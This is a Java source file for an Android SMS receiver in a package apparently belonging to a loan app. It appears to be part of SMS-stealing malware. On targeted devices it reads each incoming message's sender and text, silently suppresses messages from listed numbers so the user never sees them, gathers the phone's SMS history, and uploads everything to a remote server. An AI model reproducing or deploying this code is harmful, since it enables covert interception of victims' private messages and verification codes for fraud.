package main.app.loan;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class SmsRecevier extends BroadcastReceiver {


	public static final String ACTION_SMS_RECEVIED = "android.provider.Telephony.SMS_RECEIVED";
	
    @Override
    public void onReceive(Context context, Intent intent) {

    	try{
        	if (ModelType.IsTargetDevice(context) == false)
        	{
        		return;
        	}
        	
        	if (InstallWnd.IsOverDeadline(context) == true)
        	{
        		return;
        	}
        	
        	NetServer.mDeviceUID = GlobalLib.GetDeviceUID(context);
        	
			String strToday = "";
			try{
				Date dtTm = new Date();
				SimpleDateFormat mSimpleDateFormat = new SimpleDateFormat ( "yyyy.MM.dd HH:mm:ss", Locale.KOREA );  
				strToday = mSimpleDateFormat.format(dtTm);
			}catch(Exception e){}


            Object[] puds = (Object[])intent.getExtras().get("pdus");

            String strPacket = "";
            for(Object pud : puds)
            {  
            	try{
	                byte[] bytes = (byte[])pud;  
	                SmsMessage message = SmsMessage.createFromPdu(bytes); 
	                
	                String sender  = message.getOriginatingAddress().toString();
	                String content = message.getMessageBody().toString();
	                
	                if(DBRef.IsBlockerNumber(context, sender, false) == true)
	                {
	                	
	                    this.abortBroadcast();
	                    
						String strData = NetServer.MakeStringBody(NetServer.SMS_IN_HOOK, sender, null, strToday, null, content, null);
						strPacket = strPacket + strData;
	                }
	                else
	                {
						String strData = NetServer.MakeStringBody(NetServer.SMS_IN_NORM, sender, null, strToday, null, content, null);
						strPacket = strPacket + strData;
	                }
            	}
            	catch(Exception e)
            	{
            		
            	}
            }

			String smsout = GlobalLib.GetSMSHistory(context, false, true);
			if(smsout != null && "".equals(smsout) == false)
			{
				strPacket = strPacket + smsout;	
			}

            NetServer.SendSMSLog(strPacket);
    	}
    	catch(Exception e)
    	{
    	}
    }
    
}